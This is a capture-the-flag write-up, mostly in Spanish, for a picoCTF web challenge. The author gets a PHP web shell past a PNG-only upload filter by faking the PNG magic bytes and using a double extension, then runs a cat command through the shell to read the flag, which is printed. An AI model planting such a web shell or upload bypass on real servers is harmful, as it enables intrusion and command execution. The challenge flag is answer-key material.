
## Descripción

I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.
## Solución 

Nos encontramos en una pagina que solo permite la subida de imágenes PNG, para resolver este reto requerimos subir un archivo php que nos permita ejecutar comandos dentro del sistema.

Primero creamos un archivo php que evada la verificación de la extension .png y la validación de los magic bytes.

~~~
srriv@LAPTOP-7DDM83G8:~/SRSS/tricksterweb4$ cat webshell.php
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
srriv@LAPTOP-7DDM83G8:~/SRSS/tricksterweb4$ cp webshell.php webshell.php.png
srriv@LAPTOP-7DDM83G8:~/SRSS/tricksterweb4$ ls
webshell.php  webshell.php.png
srriv@LAPTOP-7DDM83G8:~/SRSS/tricksterweb4$ nano webshell.php.png
srriv@LAPTOP-7DDM83G8:~/SRSS/tricksterweb4$ cat webshell.php.png
PNG
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
srriv@LAPTOP-7DDM83G8:~/SRSS/tricksterweb4$ xxd webshell.php.png
00000000: 504e 470a 3c3f 7068 700a 6966 2028 6973  PNG.<?php.if (is
00000010: 7365 7428 245f 4745 545b 2763 6d64 275d  set($_GET['cmd']
00000020: 2929 207b 0a20 2020 2065 6368 6f20 223c  )) {.    echo "<
00000030: 7072 653e 223b 0a20 2020 2073 7973 7465  pre>";.    syste
00000040: 6d28 245f 4745 545b 2763 6d64 275d 293b  m($_GET['cmd']);
00000050: 0a20 2020 2065 6368 6f20 223c 2f70 7265  .    echo "</pre
00000060: 3e22 3b0a 7d0a 3f3e 0a                   >";.}.?>.
srriv@LAPTOP-7DDM83G8:~/SRSS/tricksterweb4$ mv webshell.php.png webshell.png.php
srriv@LAPTOP-7DDM83G8:~/SRSS/tricksterweb4$ ls
webshell.php  webshell.png.php
srriv@LAPTOP-7DDM83G8:~/SRSS/tricksterweb4$
~~~

Una vez en el sitio podemos ejecutar comandos mediante ese archivo subido a la pagina, donde visualizaremos en que directorio estamos y que otros archivos existen. En este caso la bandera se encontraba haciendo un cat en un archivo fuera de nuestro directorio de uploads.
~~~
http://atlas.picoctf.net:62079/uploads/webshell.png.php?cmd=cat%20../MQZWCYZWGI2WE.txt
~~~

~~~
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
~~~
## Notas adicionales 
## Referencias

